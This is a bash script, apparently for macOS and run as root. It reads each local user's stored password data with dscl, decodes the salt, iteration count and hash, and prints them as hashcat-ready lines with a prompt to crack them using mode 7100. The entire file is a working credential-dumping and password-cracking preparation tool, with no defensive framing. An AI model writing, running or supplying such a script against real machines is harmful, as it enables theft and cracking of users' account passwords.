#!/bin/bash

# Run this as root user

users=( $(dscl . list /Users | grep -v '_' | grep -v nobody | grep -v daemon | grep -v root 2>&1) )

for i in "${users[@]}"
do
	:
	command=( $(dscl . -read /Users/$i dsAttrTypeNative:ShadowHashData | grep -v dsAttr | tr -dc 0-9a-f | xxd -r -p | plutil -convert xml1 - -o - | grep -E "[a-zA-Z0-9/+=]{44}$" 2>&1) )
	if [ ${#command[2]} -gt 40 ]; then
		command2=( $(dscl . -read /Users/$i dsAttrTypeNative:ShadowHashData | grep -v dsAttr | tr -dc 0-9a-f | xxd -r -p | plutil -convert xml1 - -o - | grep -Eo "[[:digit:]]{5}" 2>1) )
		saltdecoded=( $(base64 -D <<< ${command[3]} | xxd -p | tr -dc 0-9a-f 2>&1) )
		entropy1decoded=( $(base64 -D <<< ${command[0]} | xxd -p | tr -dc 0-9a-f 2>&1) )
		entropy2decoded=( $(base64 -D <<< ${command[1]} | xxd -p | tr -dc 0-9a-f 2>&1) )
		entropy3decoded=( $(base64 -D <<< ${command[2]} | xxd -p | tr -dc 0-9a-f 2>&1) )
		entropyalldecoded=$entropy1decoded$entropy2decoded$entropy3decoded 
		integerval=${command2[0]}
		printf '+%.0s' {1..100}
		echo ""
		echo "--> Password hash for user $i:"
		echo ""
		printf "$i:\$ml\$$integerval\$$saltdecoded\$$entropyalldecoded"
		echo ""
		echo ""
		echo "--> Run Hashcat with '-m 7100 --username' to crack"
		echo ""
		printf '+%.0s' {1..100}
		echo ""
		echo "DONE!"
		echo ""
	else
		:
	fi

done
